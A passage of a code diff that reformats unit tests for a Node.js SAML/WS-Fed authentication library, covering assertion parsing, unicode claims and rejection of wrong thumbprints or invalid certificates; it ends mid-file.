var sig = new SignedXml(null, { signatureAlgorithm: 'http://www.w3.org/2000/09/xmldsig#rsa-sha1', idAttribute: 'ID' });\n-  //   // sig.addReference(\"//*[local-name(.)='Response' and namespace-uri(.)='urn:oasis:names:tc:SAML:2.0:protocol']\",\n-  //   //                 [\"http://www.w3.org/2000/09/xmldsig#enveloped-signature\", \"http://www.w3.org/2001/10/xml-exc-c14n#\"],\n-  //   //                 'http://www.w3.org/2000/09/xmldsig#sha1');\n-\n-  //   // sig.signingKey = fs.readFileSync(__dirname + '/test-auth0.key');\n-\n-  //   // sig.keyInfoProvider = {\n-  //   //   getKeyInfo: function () {\n-  //   //     return \"<X509Data><X509Certificate>\" + fs.readFileSync(__dirname + '/test-auth0.cer') + \"</X509Certificate></X509Data>\";\n-  //   //   }\n-  //   // };\n-  //   // sig.computeSignature(SAMLResponse);\n-  //   // SAMLResponse = sig.getSignedXml();\n-\n-  //   //console.log(SAMLResponse)\n-  //   // done();\n-\n-  //   var saml_passport = new SamlPassport({thumbprints: ['ea410870b7699f08888b0b5ef0fbf11a6a157b4b'],\n-  //                                         realm: 'spn:408153f4-5960-43dc-9d4f-6b717d772c8d',\n-  //                                         validateResponse: true,\n-  //                                         checkExpiration: false}); // dont check expiration since we are harcoding the token\n-  //   var profile = saml_passport.validateSamlResponse(SAMLResponse, function(err, profile) {\n-  //     if (err) return done(err);\n-\n-  //     assert.ok(profile);\n-  //     done();\n-  //   });\n-\n-  // });\n-});\n+});\n\\ No newline at end of file\n```\n\nFilename: test/saml11.tests.js:\n```\n@@ -1,196 +1,198 @@\nvar assert = require(\"assert\"),\n-  fs = require(\"fs\"),\n-  helpers = require(\"./helpers\"),\n-  saml11 = require(\"saml\").Saml11,\n-  SamlPassport = require(\"../lib/passport-wsfed-saml2/saml\").SAML;\n+    fs = require(\"fs\"),\n+    helpers = require(\"./helpers\"),\n+    saml11 = require(\"saml\").Saml11,\n+    SamlPassport = require(\"../lib/passport-wsfed-saml2/saml\").SAML;\n \n describe(\"saml 1.1 assertion\", function () {\n-  it(\"should parse attributes\", function (done) {\n-    // cert created with:\n-    // openssl req -x509 -new -newkey rsa:2048 -nodes -subj '/CN=auth0.auth0.com/O=Auth0 LLC/C=US/ST=Washington/L=Redmond' -keyout auth0.key -out auth0.pem\n-\n-    var options = {\n-      cert: fs.readFileSync(__dirname + \"/test-auth0.pem\"),\n-      key: fs.readFileSync(__dirname + \"/test-auth0.key\"),\n-      issuer: \"urn:issuer\",\n-      lifetimeInSeconds: 600,\n-      audiences: \"urn:myapp\",\n-      attributes: {\n-        \"http://schemas.xmlsoap.org/ws/2005/05/identity/claims/emailaddress\":\n-          \"foo@bar.com\",\n-        \"http://schemas.xmlsoap.org/ws/2005/05/identity/claims/name\": \"Foo Bar\",\n-      },\n-      nameIdentifier: \"foo\",\n-      nameIdentifierFormat:\n-        \"urn:oasis:names:tc:SAML:1.1:nameid-format:unspecified\",\n-    };\n-\n-    var signedAssertion = saml11.create(options);\n-\n-    var publicKey = fs.readFileSync(__dirname + \"/test-auth0.cer\").toString();\n-    var saml_passport = new SamlPassport({\n-      cert: publicKey,\n-      realm: \"urn:myapp\",\n-      checkRecipient: false,\n-    });\n-    saml_passport.validateSamlAssertion(\n-      signedAssertion,\n-      function (error, profile) {\n-        assert.ok(profile);\n-        assert.equal(\n-          \"foo\",\n-          profile[\n-            \"http://schemas.xmlsoap.org/ws/2005/05/identity/claims/nameidentifier\"\n-          ]\n-        );\n-        assert.equal(\n-          \"Foo Bar\",\n-          profile[\"http://schemas.xmlsoap.org/ws/2005/05/identity/claims/name\"]\n+    it(\"should parse attributes\", function (done) {\n+        // cert created with:\n+        // openssl req -x509 -new -newkey rsa:2048 -nodes -subj '/CN=auth0.auth0.com/O=Auth0 LLC/C=US/ST=Washington/L=Redmond' -keyout auth0.key -out auth0.pem\n+\n+        var options = {\n+            cert: fs.readFileSync(__dirname + \"/test-auth0.pem\"),\n+            key: fs.readFileSync(__dirname + \"/test-auth0.key\"),\n+            issuer: \"urn:issuer\",\n+            lifetimeInSeconds: 600,\n+            audiences: \"urn:myapp\",\n+            attributes: {\n+                \"http://schemas.xmlsoap.org/ws/2005/05/identity/claims/emailaddress\":\n+                    \"foo@bar.com\",\n+                \"http://schemas.xmlsoap.org/ws/2005/05/identity/claims/name\": \"Foo Bar\",\n+            },\n+            nameIdentifier: \"foo\",\n+            nameIdentifierFormat:\n+                \"urn:oasis:names:tc:SAML:1.1:nameid-format:unspecified\",\n+        };\n+\n+        var signedAssertion = saml11.create(options);\n+\n+        var publicKey = fs.readFileSync(__dirname + \"/test-auth0.cer\").toString();\n+        var saml_passport = new SamlPassport({\n+            cert: publicKey,\n+            realm: \"urn:myapp\",\n+            checkRecipient: false,\n+        });\n+        saml_passport.validateSamlAssertion(\n+            signedAssertion, {},\n+            function (error, profile) {\n+                assert.ok(profile);\n+                assert.equal(\n+                    \"foo\",\n+                    profile[\n+                        \"http://schemas.xmlsoap.org/ws/2005/05/identity/claims/nameidentifier\"\n+                        ]\n+                );\n+                assert.equal(\n+                    \"Foo Bar\",\n+                    profile[\"http://schemas.xmlsoap.org/ws/2005/05/identity/claims/name\"]\n+                );\n+                assert.equal(\n+                    \"foo@bar.com\",\n+                    profile[\n+                        \"http://schemas.xmlsoap.org/ws/2005/05/identity/claims/emailaddress\"\n+                        ]\n+                );\n+                assert.equal(\"foo@bar.com\", profile[\"email\"]);\n+                assert.equal(\"urn:issuer\", profile[\"issuer\"]);\n+                done();\n+            }\n         );\n-        assert.equal(\n-          \"foo@bar.com\",\n-          profile[\n-            \"http://schemas.xmlsoap.org/ws/2005/05/identity/claims/emailaddress\"\n-          ]\n-        );\n-        assert.equal(\"foo@bar.com\", profile[\"email\"]);\n-        assert.equal(\"urn:issuer\", profile[\"issuer\"]);\n-        done();\n-      }\n-    );\n-  });\n-\n-  it(\"should handle unicode\", function (done) {\n-    var options = {\n-      cert: fs.readFileSync(__dirname + \"/test-auth0.pem\"),\n-      key: fs.readFileSync(__dirname + \"/test-auth0.key\"),\n-      issuer: \"urn:issuer\",\n-      lifetimeInSeconds: 600,\n-      audiences: \"urn:myapp\",\n-      attributes: {\n-        \"http://schemas.xmlsoap.org/ws/2005/05/identity/claims/emailaddress\":\n-          \"\u0441\u043e\u043e\u0431\u0449\u0438\u0442\u044c@bar.com\",\n-        \"http://schemas.xmlsoap.org/ws/2005/05/identity/claims/name\":\n-          \"\u0441\u043e\u043e\u0431\u0449\u0438\u0442\u044c \u0432\u041a\u043e\u043d\u0442\u0430\u043a\u0442\u0435\",\n-      },\n-      nameIdentifier: \"\u0432\u041a\u043e\u043d\u0442\u0430\u043a\u0442\u0435\",\n-      nameIdentifierFormat:\n-        \"urn:oasis:names:tc:SAML:1.1:nameid-format:unspecified\",\n-    };\n-\n-    var signedAssertion = saml11.create(options);\n-\n-    var publicKey = fs.readFileSync(__dirname + \"/test-auth0.cer\").toString();\n-    var saml_passport = new SamlPassport({\n-      cert: publicKey,\n-      realm: \"urn:myapp\",\n-      checkRecipient: false,\n     });\n-    var profile = saml_passport.validateSamlAssertion(\n-      signedAssertion,\n-      function (error, profile) {\n-        if (error) return done(error);\n-\n-        assert.ok(profile);\n-        assert.equal(\n-          \"\u0432\u041a\u043e\u043d\u0442\u0430\u043a\u0442\u0435\",\n-          profile[\n-            \"http://schemas.xmlsoap.org/ws/2005/05/identity/claims/nameidentifier\"\n-          ]\n-        );\n-        assert.equal(\n-          \"\u0441\u043e\u043e\u0431\u0449\u0438\u0442\u044c \u0432\u041a\u043e\u043d\u0442\u0430\u043a\u0442\u0435\",\n-          profile[\"http://schemas.xmlsoap.org/ws/2005/05/identity/claims/name\"]\n-        );\n-        assert.equal(\n-          \"\u0441\u043e\u043e\u0431\u0449\u0438\u0442\u044c@bar.com\",\n-          profile[\n-            \"http://schemas.xmlsoap.org/ws/2005/05/identity/claims/emailaddress\"\n-          ]\n-        );\n-        done();\n-      }\n-    );\n-  });\n-\n-  it(\"should validate an assertion from office365\", function (done) {\n-    var signedAssertion =\n-      '<Assertion ID=\"_1b1ffaef-86ef-42e1-92cf-cf8c9d9a4ce0\" IssueInstant=\"2013-04-02T18:50:24.000Z\" Version=\"2.0\" xmlns=\"urn:oasis:names:tc:SAML:2.0:assertion\"><Issuer>https://sts.windows.net/75696069-df44-4310-9bcf-08b45e3007c9/</Issuer><ds:Signature xmlns:ds=\"http://www.w3.org/2000/09/xmldsig#\"><ds:SignedInfo><ds:CanonicalizationMethod Algorithm=\"http://www.w3.org/2001/10/xml-exc-c14n#\" /><ds:SignatureMethod Algorithm=\"http://www.w3.org/2001/04/xmldsig-more#rsa-sha256\" /><ds:Reference URI=\"#_1b1ffaef-86ef-42e1-92cf-cf8c9d9a4ce0\"><ds:Transforms><ds:Transform Algorithm=\"http://www.w3.org/2000/09/xmldsig#enveloped-signature\" /><ds:Transform Algorithm=\"http://www.w3.org/2001/10/xml-exc-c14n#\" /></ds:Transforms><ds:DigestMethod Algorithm=\"http://www.w3.org/2001/04/xmlenc#sha256\" /><ds:DigestValue>TzJmLs0BTPgpaPLsA7L2Kd9l1k4IBOmwIM/znV2iOPU=</ds:DigestValue></ds:Reference></ds:SignedInfo><ds:SignatureValue>OHJCAffCNPRkwsE3RqnVPoCRSqsPrio8prABauzu2pqF418Y1QJuJehhzztY8A6kwnBUkBVE7BIyLe7kgCnBoNZWElYki1xtaLksc/Afc0TjlZvv9IJ9fQHIBiL1JA9KcySq1tu9dv/NauykBODXuljPuVTk6I4xLLWcg20o26Ov57axp42uWPpcJHtasomLmmmnAXEh6P7aB/1Vlm/MAJhWXToxacauJzFao3F9JNEuucKY6y3RPDp1Qq3vL0gq98RKuiaejayu6RjyyU2+8vCBzURul8b7ZXPUHfIOME6Q5LvbKqLhe/mzqRc+9GUg22X3B5SYjdnXjwHbBTbihA==</ds:SignatureValue><KeyInfo xmlns=\"http://www.w3.org/2000/09/xmldsig#\"><X509Data><X509Certificate>MIIDPjCCAiqgAwIBAgIQVWmXY/+9RqFA/OG9kFulHDAJBgUrDgMCHQUAMC0xKzApBgNVBAMTImFjY291bnRzLmFjY2Vzc2NvbnRyb2wud2luZG93cy5uZXQwHhcNMTIwNjA3MDcwMDAwWhcNMTQwNjA3MDcwMDAwWjAtMSswKQYDVQQDEyJhY2NvdW50cy5hY2Nlc3Njb250cm9sLndpbmRvd3MubmV0MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEArCz8Sn3GGXmikH2MdTeGY1D711EORX/lVXpr+ecGgqfUWF8MPB07XkYuJ54DAuYT318+2XrzMjOtqkT94VkXmxv6dFGhG8YZ8vNMPd4tdj9c0lpvWQdqXtL1TlFRpD/P6UMEigfN0c9oWDg9U7Ilymgei0UXtf1gtcQbc5sSQU0S4vr9YJp2gLFIGK11Iqg4XSGdcI0QWLLkkC6cBukhVnd6BCYbLjTYy3fNs4DzNdemJlxGl8sLexFytBF6YApvSdus3nFXaMCtBGx16HzkK9ne3lobAwL2o79bP4imEGqg+ibvyNmbrwFGnQrBc1jTF9LyQX9q+louxVfHs6ZiVwIDAQABo2IwYDBeBgNVHQEEVzBVgBCxDDsLd8xkfOLKm4Q/SzjtoS8wLTErMCkGA1UEAxMiYWNjb3VudHMuYWNjZXNzY29udHJvbC53aW5kb3dzLm5ldIIQVWmXY/+9RqFA/OG9kFulHDAJBgUrDgMCHQUAA4IBAQAkJtxxm/ErgySlNk69+1odTMP8Oy6L0H17z7XGG3w4TqvTUSWaxD4hSFJ0e7mHLQLQD7oV/erACXwSZn2pMoZ89MBDjOMQA+e6QzGB7jmSzPTNmQgMLA8fWCfqPrz6zgH+1F1gNp8hJY57kfeVPBiyjuBmlTEBsBlzolY9dd/55qqfQk6cgSeCbHCy/RU/iep0+UsRMlSgPNNmqhj5gmN2AFVCN96zF694LwuPae5CeR2ZcVknexOWHYjFM0MgUSw0ubnGl0h9AJgGyhvNGcjQqu9vd1xkupFgaN+f7P3p3EVN5csBg5H94jEcQZT7EKeTiZ6bTrpDAnrr8tDCy8ng</X509Certificate></X509Data></KeyInfo></ds:Signature><Subject><NameID>10030000838D23AF@MicrosoftOnline.com</NameID><SubjectConfirmation Method=\"urn:oasis:names:tc:SAML:2.0:cm:bearer\" /></Subject><Conditions NotBefore=\"2013-04-02T18:50:23.969Z\" NotOnOrAfter=\"2013-04-03T06:50:23.969Z\"><AudienceRestriction><Audience>spn:408153f4-5960-43dc-9d4f-6b717d772c8d</Audience></AudienceRestriction></Conditions><AttributeStatement><Attribute Name=\"http://schemas.microsoft.com/identity/claims/tenantid\"><AttributeValue>75696069-df44-4310-9bcf-08b45e3007c9</AttributeValue></Attribute><Attribute Name=\"http://schemas.xmlsoap.org/ws/2005/05/identity/claims/givenname\"><AttributeValue>Matias</AttributeValue></Attribute><Attribute Name=\"http://schemas.xmlsoap.org/ws/2005/05/identity/claims/name\"><AttributeValue>matias@auth0.onmicrosoft.com</AttributeValue></Attribute><Attribute Name=\"http://schemas.xmlsoap.org/ws/2005/05/identity/claims/surname\"><AttributeValue>Woloski</AttributeValue></Attribute><Attribute Name=\"http://schemas.microsoft.com/identity/claims/identityprovider\"><AttributeValue>https://sts.windows.net/75696069-df44-4310-9bcf-08b45e3007c9/</AttributeValue></Attribute></AttributeStatement><AuthnStatement AuthnInstant=\"2013-04-02T18:50:16.000Z\"><AuthnContext><AuthnContextClassRef>urn:oasis:names:tc:SAML:2.0:ac:classes:Password</AuthnContextClassRef></AuthnContext></AuthnStatement></Assertion>';\n-\n-    var saml_passport = new SamlPassport({\n-      thumbprints: [\"3464c5bdd2be7f2b6112e2f08e9c0024e33d9fe0\"],\n-      realm: \"spn:408153f4-5960-43dc-9d4f-6b717d772c8d\",\n-      checkRecipient: false,\n-      checkExpiration: false,\n-    }); // dont check expiration since we are harcoding the token\n-    var profile = saml_passport.validateSamlAssertion(\n-      signedAssertion,\n-      function (error, profile) {\n-        assert.ok(profile);\n-        done();\n-      }\n-    );\n-  });\n-\n-  it(\"should return error if validation fails\", function (done) {\n-    var signedAssertion =\n-      '<Assertion ID=\"_1b1ffaef-86ef-42e1-92cf-cf8c9d9a4ce0\" IssueInstant=\"2013-04-02T18:50:24.000Z\" Version=\"2.0\" xmlns=\"urn:oasis:names:tc:SAML:2.0:assertion\"><Issuer>https://sts.windows.net/75696069-df44-4310-9bcf-08b45e3007c9/</Issuer><ds:Signature xmlns:ds=\"http://www.w3.org/2000/09/xmldsig#\"><ds:SignedInfo><ds:CanonicalizationMethod Algorithm=\"http://www.w3.org/2001/10/xml-exc-c14n#\" /><ds:SignatureMethod Algorithm=\"http://www.w3.org/2001/04/xmldsig-more#rsa-sha256\" /><ds:Reference URI=\"#_1b1ffaef-86ef-42e1-92cf-cf8c9d9a4ce0\"><ds:Transforms><ds:Transform Algorithm=\"http://www.w3.org/2000/09/xmldsig#enveloped-signature\" /><ds:Transform Algorithm=\"http://www.w3.org/2001/10/xml-exc-c14n#\" /></ds:Transforms><ds:DigestMethod Algorithm=\"http://www.w3.org/2001/04/xmlenc#sha256\" /><ds:DigestValue>TzJmLs0BTPgpaPLsA7L2Kd9l1k4IBOmwIM/znV2iOPU=</ds:DigestValue></ds:Reference></ds:SignedInfo><ds:SignatureValue>OHJCAffCNPRkwsE3RqnVPoCRSqsPrio8prABauzu2pqF418Y1QJuJehhzztY8A6kwnBUkBVE7BIyLe7kgCnBoNZWElYki1xtaLksc/Afc0TjlZvv9IJ9fQHIBiL1JA9KcySq1tu9dv/NauykBODXuljPuVTk6I4xLLWcg20o26Ov57axp42uWPpcJHtasomLmmmnAXEh6P7aB/1Vlm/MAJhWXToxacauJzFao3F9JNEuucKY6y3RPDp1Qq3vL0gq98RKuiaejayu6RjyyU2+8vCBzURul8b7ZXPUHfIOME6Q5LvbKqLhe/mzqRc+9GUg22X3B5SYjdnXjwHbBTbihA==</ds:SignatureValue><KeyInfo xmlns=\"http://www.w3.org/2000/09/xmldsig#\"><X509Data><X509Certificate>MIIDPjCCAiqgAwIBAgIQVWmXY/+9RqFA/OG9kFulHDAJBgUrDgMCHQUAMC0xKzApBgNVBAMTImFjY291bnRzLmFjY2Vzc2NvbnRyb2wud2luZG93cy5uZXQwHhcNMTIwNjA3MDcwMDAwWhcNMTQwNjA3MDcwMDAwWjAtMSswKQYDVQQDEyJhY2NvdW50cy5hY2Nlc3Njb250cm9sLndpbmRvd3MubmV0MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEArCz8Sn3GGXmikH2MdTeGY1D711EORX/lVXpr+ecGgqfUWF8MPB07XkYuJ54DAuYT318+2XrzMjOtqkT94VkXmxv6dFGhG8YZ8vNMPd4tdj9c0lpvWQdqXtL1TlFRpD/P6UMEigfN0c9oWDg9U7Ilymgei0UXtf1gtcQbc5sSQU0S4vr9YJp2gLFIGK11Iqg4XSGdcI0QWLLkkC6cBukhVnd6BCYbLjTYy3fNs4DzNdemJlxGl8sLexFytBF6YApvSdus3nFXaMCtBGx16HzkK9ne3lobAwL2o79bP4imEGqg+ibvyNmbrwFGnQrBc1jTF9LyQX9q+louxVfHs6ZiVwIDAQABo2IwYDBeBgNVHQEEVzBVgBCxDDsLd8xkfOLKm4Q/SzjtoS8wLTErMCkGA1UEAxMiYWNjb3VudHMuYWNjZXNzY29udHJvbC53aW5kb3dzLm5ldIIQVWmXY/+9RqFA/OG9kFulHDAJBgUrDgMCHQUAA4IBAQAkJtxxm/ErgySlNk69+1odTMP8Oy6L0H17z7XGG3w4TqvTUSWaxD4hSFJ0e7mHLQLQD7oV/erACXwSZn2pMoZ89MBDjOMQA+e6QzGB7jmSzPTNmQgMLA8fWCfqPrz6zgH+1F1gNp8hJY57kfeVPBiyjuBmlTEBsBlzolY9dd/55qqfQk6cgSeCbHCy/RU/iep0+UsRMlSgPNNmqhj5gmN2AFVCN96zF694LwuPae5CeR2ZcVknexOWHYjFM0MgUSw0ubnGl0h9AJgGyhvNGcjQqu9vd1xkupFgaN+f7P3p3EVN5csBg5H94jEcQZT7EKeTiZ6bTrpDAnrr8tDCy8ng</X509Certificate></X509Data></KeyInfo></ds:Signature><Subject><NameID>10030000838D23AF@MicrosoftOnline.com</NameID><SubjectConfirmation Method=\"urn:oasis:names:tc:SAML:2.0:cm:bearer\" /></Subject><Conditions NotBefore=\"2013-04-02T18:50:23.969Z\" NotOnOrAfter=\"2013-04-03T06:50:23.969Z\"><AudienceRestriction><Audience>spn:408153f4-5960-43dc-9d4f-6b717d772c8d</Audience></AudienceRestriction></Conditions><AttributeStatement><Attribute Name=\"http://schemas.microsoft.com/identity/claims/tenantid\"><AttributeValue>75696069-df44-4310-9bcf-08b45e3007c9</AttributeValue></Attribute><Attribute Name=\"http://schemas.xmlsoap.org/ws/2005/05/identity/claims/givenname\"><AttributeValue>Matias</AttributeValue></Attribute><Attribute Name=\"http://schemas.xmlsoap.org/ws/2005/05/identity/claims/name\"><AttributeValue>matias@auth0.onmicrosoft.com</AttributeValue></Attribute><Attribute Name=\"http://schemas.xmlsoap.org/ws/2005/05/identity/claims/surname\"><AttributeValue>Woloski</AttributeValue></Attribute><Attribute Name=\"http://schemas.microsoft.com/identity/claims/identityprovider\"><AttributeValue>https://sts.windows.net/75696069-df44-4310-9bcf-08b45e3007c9/</AttributeValue></Attribute></AttributeStatement><AuthnStatement AuthnInstant=\"2013-04-02T18:50:16.000Z\"><AuthnContext><AuthnContextClassRef>urn:oasis:names:tc:SAML:2.0:ac:classes:Password</AuthnContextClassRef></AuthnContext></AuthnStatement></Assertion>';\n-\n-    var saml_passport = new SamlPassport({\n-      thumbprints: [\n-        \"3464c5bdd2be7f2b6112e2f08e9c0024e33d9fe1\",\n-        \"3464c5bdd2be7f2b6112e2f08e9c0024e33d9fe2\",\n-      ], // WRONG thumbprints\n-      realm: \"spn:408153f4-5960-43dc-9d4f-6b717d772c8d\",\n-      checkRecipient: false,\n-      checkExpiration: false,\n-    }); // dont check expiration since we are harcoding the token\n-    var profile = saml_passport.validateSamlAssertion(\n-      signedAssertion,\n-      function (error, profile) {\n-        assert.equal(\n-          \"Invalid thumbprint (configured: 3464C5BDD2BE7F2B6112E2F08E9C0024E33D9FE1, 3464C5BDD2BE7F2B6112E2F08E9C0024E33D9FE2. calculated: 3464C5BDD2BE7F2B6112E2F08E9C0024E33D9FE0)\",\n-          error.message\n+\n+    it(\"should handle unicode\", function (done) {\n+        var options = {\n+            cert: fs.readFileSync(__dirname + \"/test-auth0.pem\"),\n+            key: fs.readFileSync(__dirname + \"/test-auth0.key\"),\n+            issuer: \"urn:issuer\",\n+            lifetimeInSeconds: 600,\n+            audiences: \"urn:myapp\",\n+            attributes: {\n+                \"http://schemas.xmlsoap.org/ws/2005/05/identity/claims/emailaddress\":\n+                    \"\u0441\u043e\u043e\u0431\u0449\u0438\u0442\u044c@bar.com\",\n+                \"http://schemas.xmlsoap.org/ws/2005/05/identity/claims/name\":\n+                    \"\u0441\u043e\u043e\u0431\u0449\u0438\u0442\u044c \u0432\u041a\u043e\u043d\u0442\u0430\u043a\u0442\u0435\",\n+            },\n+            nameIdentifier: \"\u0432\u041a\u043e\u043d\u0442\u0430\u043a\u0442\u0435\",\n+            nameIdentifierFormat:\n+                \"urn:oasis:names:tc:SAML:1.1:nameid-format:unspecified\",\n+        };\n+\n+        var signedAssertion = saml11.create(options);\n+\n+        var publicKey = fs.readFileSync(__dirname + \"/test-auth0.cer\").toString();\n+        var saml_passport = new SamlPassport({\n+            cert: publicKey,\n+            realm: \"urn:myapp\",\n+            checkRecipient: false,\n+        });\n+        var profile = saml_passport.validateSamlAssertion(\n+            signedAssertion, {},\n+            function (error, profile) {\n+                if (error) return done(error);\n+\n+                assert.ok(profile);\n+                assert.equal(\n+                    \"\u0432\u041a\u043e\u043d\u0442\u0430\u043a\u0442\u0435\",\n+                    profile[\n+                        \"http://schemas.xmlsoap.org/ws/2005/05/identity/claims/nameidentifier\"\n+                        ]\n+                );\n+                assert.equal(\n+                    \"\u0441\u043e\u043e\u0431\u0449\u0438\u0442\u044c \u0432\u041a\u043e\u043d\u0442\u0430\u043a\u0442\u0435\",\n+                    profile[\"http://schemas.xmlsoap.org/ws/2005/05/identity/claims/name\"]\n+                );\n+                assert.equal(\n+                    \"\u0441\u043e\u043e\u0431\u0449\u0438\u0442\u044c@bar.com\",\n+                    profile[\n+                        \"http://schemas.xmlsoap.org/ws/2005/05/identity/claims/emailaddress\"\n+                        ]\n+                );\n+                done();\n+            }\n         );\n-        done();\n-      }\n-    );\n-  });\n-\n-  it(\"should fail when the X509Certificate is invalid\", function (done) {\n-    const signedAssertion = fs\n-      .readFileSync(\n-        __dirname + \"/samples/plain/samlresponse_saml11_invalid_cert.txt\"\n-      )\n-      .toString();\n-    const options = {\n-      checkDestination: false,\n-      thumbprint: \"119B9E027959CDB7C662CFD075D9E2EF384E445F\",\n-    };\n-\n-    const saml_passport = new SamlPassport(options);\n-    saml_passport.validateSamlAssertion(\n-      signedAssertion,\n-      function (err, profile) {\n-        const errorMessages = [\n-          \"The signing certificate is invalid (PEM_read_bio_PUBKEY failed)\",\n-          \"The signing certificate is invalid (error:0906700D:PEM routines:PEM_ASN1_read_bio:ASN1 lib, error:0D07803A:asn1 encoding routines:ASN1_ITEM_EX_D2I:nested asn1 error, error:0D068066:asn1 encoding routines:ASN1_CHECK_TLEN:bad object header)\",\n-          \"The signing certificate is invalid (error:0D07803A:asn1 encoding routines:asn1_item_embed_d2i:nested asn1 error, error:0D068066:asn1 encoding routines:asn1_check_tlen:bad object header)\",\n-          \"The signing certificate is invalid (error:0688010A:asn1 encoding routines::nested asn1 error, error:06800066:asn1 encoding routines::bad object header)\",\n-        ];\n-\n-        assert.ok(err, \"The signing certificate was unexpectedly valid\");\n-        assert.ok(\n-          /signing certificate is invalid/.test(err.message),\n-          \"Error message is not the default invalid message\"\n+    });\n+\n+    it(\"should validate an assertion from office365\", function (done) {\n+        var signedAssertion =\n+            '<Assertion ID=\"_1b1ffaef-86ef-42e1-92cf-cf8c9d9a4ce0\" IssueInstant=\"2013-04-02T18:50:24.000Z\" Version=\"2.0\" xmlns=\"urn:oasis:names:tc:SAML:2.0:assertion\"><Issuer>https://sts.windows.net/75696069-df44-4310-9bcf-08b45e3007c9/</Issuer><ds:Signature xmlns:ds=\"http://www.w3.org/2000/09/xmldsig#\"><ds:SignedInfo><ds:CanonicalizationMethod Algorithm=\"http://www.w3.org/2001/10/xml-exc-c14n#\" /><ds:SignatureMethod Algorithm=\"http://www.w3.org/2001/04/xmldsig-more#rsa-sha256\" /><ds:Reference URI=\"#_1b1ffaef-86ef-42e1-92cf-cf8c9d9a4ce0\"><ds:Transforms><ds:Transform Algorithm=\"http://www.w3.org/2000/09/xmldsig#enveloped-signature\" /><ds:Transform Algorithm=\"http://www.w3.org/2001/10/xml-exc-c14n#\" /></ds:Transforms><ds:DigestMethod Algorithm=\"http://www.w3.org/2001/04/xmlenc#sha256\" /><ds:DigestValue>TzJmLs0BTPgpaPLsA7L2Kd9l1k4IBOmwIM/znV2iOPU=</ds:DigestValue></ds:Reference></ds:SignedInfo><ds:SignatureValue>OHJCAffCNPRkwsE3RqnVPoCRSqsPrio8prABauzu2pqF418Y1QJuJehhzztY8A6kwnBUkBVE7BIyLe7kgCnBoNZWElYki1xtaLksc/Afc0TjlZvv9IJ9fQHIBiL1JA9KcySq1tu9dv/NauykBODXuljPuVTk6I4xLLWcg20o26Ov57axp42uWPpcJHtasomLmmmnAXEh6P7aB/1Vlm/MAJhWXToxacauJzFao3F9JNEuucKY6y3RPDp1Qq3vL0gq98RKuiaejayu6RjyyU2+8vCBzURul8b7ZXPUHfIOME6Q5LvbKqLhe/mzqRc+9GUg22X3B5SYjdnXjwHbBTbihA==</ds:SignatureValue><KeyInfo xmlns=\"http://www.w3.org/2000/09/xmldsig#\"><X509Data><X509Certificate>MIIDPjCCAiqgAwIBAgIQVWmXY/+9RqFA/OG9kFulHDAJBgUrDgMCHQUAMC0xKzApBgNVBAMTImFjY291bnRzLmFjY2Vzc2NvbnRyb2wud2luZG93cy5uZXQwHhcNMTIwNjA3MDcwMDAwWhcNMTQwNjA3MDcwMDAwWjAtMSswKQYDVQQDEyJhY2NvdW50cy5hY2Nlc3Njb250cm9sLndpbmRvd3MubmV0MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEArCz8Sn3GGXmikH2MdTeGY1D711EORX/lVXpr+ecGgqfUWF8MPB07XkYuJ54DAuYT318+2XrzMjOtqkT94VkXmxv6dFGhG8YZ8vNMPd4tdj9c0lpvWQdqXtL1TlFRpD/P6UMEigfN0c9oWDg9U7Ilymgei0UXtf1gtcQbc5sSQU0S4vr9YJp2gLFIGK11Iqg4XSGdcI0QWLLkkC6cBukhVnd6BCYbLjTYy3fNs4DzNdemJlxGl8sLexFytBF6YApvSdus3nFXaMCtBGx16HzkK9ne3lobAwL2o79bP4imEGqg+ibvyNmbrwFGnQrBc1jTF9LyQX9q+louxVfHs6ZiVwIDAQABo2IwYDBeBgNVHQEEVzBVgBCxDDsLd8xkfOLKm4Q/SzjtoS8wLTErMCkGA1UEAxMiYWNjb3VudHMuYWNjZXNzY29udHJvbC53aW5kb3dzLm5ldIIQVWmXY/+9RqFA/OG9kFulHDAJBgUrDgMCHQUAA4IBAQAkJtxxm/ErgySlNk69+1odTMP8Oy6L0H17z7XGG3w4TqvTUSWaxD4hSFJ0e7mHLQLQD7oV/erACXwSZn2pMoZ89MBDjOMQA+e6QzGB7jmSzPTNmQgMLA8fWCfqPrz6zgH+1F1gNp8hJY57kfeVPBiyjuBmlTEBsBlzolY9dd/55qqfQk6cgSeCbHCy/RU/iep0+UsRMlSgPNNmqhj5gmN2AFVCN96zF694LwuPae5CeR2ZcVknexOWHYjFM0MgUSw0ubnGl0h9AJgGyhvNGcjQqu9vd1xkupFgaN+f7P3p3EVN5csBg5H94jEcQZT7EKeTiZ6bTrpDAnrr8tDCy8ng</X509Certificate></X509Data></KeyInfo></ds:Signature><Subject><NameID>10030000838D23AF@MicrosoftOnline.com</NameID><SubjectConfirmation Method=\"urn:oasis:names:tc:SAML:2.0:cm:bearer\" /></Subject><Conditions NotBefore=\"2013-04-02T18:50:23.969Z\" NotOnOrAfter=\"2013-04-03T06:50:23.969Z\"><AudienceRestriction><Audience>spn:408153f4-5960-43dc-9d4f-6b717d772c8d</Audience></AudienceRestriction></Conditions><AttributeStatement><Attribute Name=\"http://schemas.microsoft.com/identity/claims/tenantid\"><AttributeValue>75696069-df44-4310-9bcf-08b45e3007c9</AttributeValue></Attribute><Attribute Name=\"http://schemas.xmlsoap.org/ws/2005/05/identity/claims/givenname\"><AttributeValue>Matias</AttributeValue></Attribute><Attribute Name=\"http://schemas.xmlsoap.org/ws/2005/05/identity/claims/name\"><AttributeValue>matias@auth0.onmicrosoft.com</AttributeValue></Attribute><Attribute Name=\"http://schemas.xmlsoap.org/ws/2005/05/identity/claims/surname\"><AttributeValue>Woloski</AttributeValue></Attribute><Attribute Name=\"http://schemas.microsoft.com/identity/claims/identityprovider\"><AttributeValue>https://sts.windows.net/75696069-df44-4310-9bcf-08b45e3007c9/</AttributeValue></Attribute></AttributeStatement><AuthnStatement AuthnInstant=\"2013-04-02T18:50:16.000Z\"><AuthnContext><AuthnContextClassRef>urn:oasis:names:tc:SAML:2.0:ac:classes:Password</AuthnContextClassRef></AuthnContext></AuthnStatement></Assertion>';\n+\n+        var saml_passport = new SamlPassport({\n+            thumbprints: [\"3464c5bdd2be7f2b6112e2f08e9c0024e33d9fe0\"],\n+            realm: \"spn:408153f4-5960-43dc-9d4f-6b717d772c8d\",\n+            checkRecipient: false,\n+          